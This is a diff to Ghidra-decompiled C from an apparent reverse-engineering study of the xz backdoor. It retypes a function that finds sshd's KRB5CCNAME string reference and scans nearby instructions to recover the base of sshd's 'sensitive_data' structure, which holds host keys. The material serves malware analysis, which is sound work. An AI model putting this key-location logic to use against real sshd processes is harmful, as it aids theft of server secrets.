@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103340_sshd_find_sensitive_data_base_via_krb5ccname.c
 // Function: sshd_find_sensitive_data_base_via_krb5ccname @ 0x103340
 // Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, void * * sensitive_data_out, elf_info_t * elf)
+// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, sensitive_data * * sensitive_data_out, elf_info_t * elf)
 
 
 /*
@@ -11,8 +11,8 @@
 #include "xzre_types.h"
 
 BOOL sshd_find_sensitive_data_base_via_krb5ccname
-               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,void **sensitive_data_out,
-               elf_info_t *elf)
+               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
+               sensitive_data **sensitive_data_out,elf_info_t *elf)
 
 {
   u8 dest_reg;
@@ -22,7 +22,7 @@ BOOL sshd_find_sensitive_data_base_via_krb5ccname
   uint probe_depth;
   long clear_idx;
   u8 rex_extension;
-  u8 *data_cursor;
+  sensitive_data *data_cursor;
   u8 *store_scan_cursor;
   dasm_ctx_t *zero_ctx_cursor;
   u8 tracked_reg;
@@ -37,7 +37,7 @@ BOOL sshd_find_sensitive_data_base_via_krb5ccname
     *(u32 *)&zero_ctx_cursor->instruction = 0;
     zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
   }
-  *sensitive_data_out = (void *)0x0;
+  *sensitive_data_out = (sensitive_data *)0x0;
   // AutoDoc: Use the cached string table to jump straight to the block that references `KRB5CCNAME`.
   krb5_string_ref = elf_find_encoded_string_xref_site(elf,STR_KRB5CCNAME,code_start,code_end);
   if (krb5_string_ref != (u8 *)0x0) {
@@ -129,7 +129,7 @@ LAB_00103553:
                                  store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                       }
                       // AutoDoc: Back up by 0x18 bytes to convert the field pointer into the `sensitive_data` base address.
-                      data_cursor = candidate_store + -0x18;
+                      data_cursor = (sensitive_data *)(candidate_store + -0x18);
                       if ((data_start <= data_cursor && candidate_store != (u8 *)0x18) && (candidate_store + 4 <= data_end)
                          ) goto LAB_0010365f;
                     }
@@ -151,8 +151,9 @@ LAB_00103553:
             if ((string_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
               store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size + string_scan_ctx.mem_disp;
             }
-            data_cursor = store_scan_cursor + -0x18;
-            if (((store_scan_cursor + 4 <= data_end) && (data_start <= data_cursor)) && (data_cursor != (u8 *)0x0)) {
+            data_cursor = (sensitive_data *)(store_scan_cursor + -0x18);
+            if (((store_scan_cursor + 4 <= data_end) && (data_start <= data_cursor)) &&
+               (data_cursor != (sensitive_data *)0x0)) {
 LAB_0010365f:
               *sensitive_data_out = data_cursor;
               return TRUE;
